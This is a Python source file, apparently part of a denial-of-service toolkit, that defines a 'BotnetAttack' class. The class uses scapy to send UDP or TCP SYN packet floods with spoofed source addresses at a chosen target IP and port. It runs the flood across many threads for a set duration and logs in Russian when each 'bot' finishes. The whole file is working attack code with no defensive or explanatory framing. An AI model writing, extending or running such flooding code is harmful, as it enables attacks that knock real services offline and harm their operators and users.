import threading
import time
from scapy.all import IP, UDP, TCP, send
from ..config import Config, logger
from ..utils.proxy import get_random_proxy

class BotnetAttack:
    def __init__(self, target_ip, port, botnet_type, duration):
        self.target_ip = target_ip
        self.port = port
        self.botnet_type = botnet_type
        self.duration = duration
        self.stop_event = threading.Event()

    def stop(self):
        self.stop_event.set()

    def run(self):
        def bot_attack(bot_id):
            pkt = (
                IP(dst=self.target_ip, src=f"192.168.1.{bot_id}") /
                (UDP(dport=self.port, sport=12345) if self.botnet_type in ['UDPBYPASS-BOT', 'GREBOT'] else TCP(dport=self.port, sport=12345, flags='S'))
            )
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_event.is_set():
                send(pkt, verbose=0)
            logger.info(f"{self.botnet_type} бот {bot_id} завершил атаку")
        
        threads = [threading.Thread(target=bot_attack, args=(i,)) for i in range(Config['threads'])]
        for t in threads:
            t.start()
        for t in threads:
            t.join()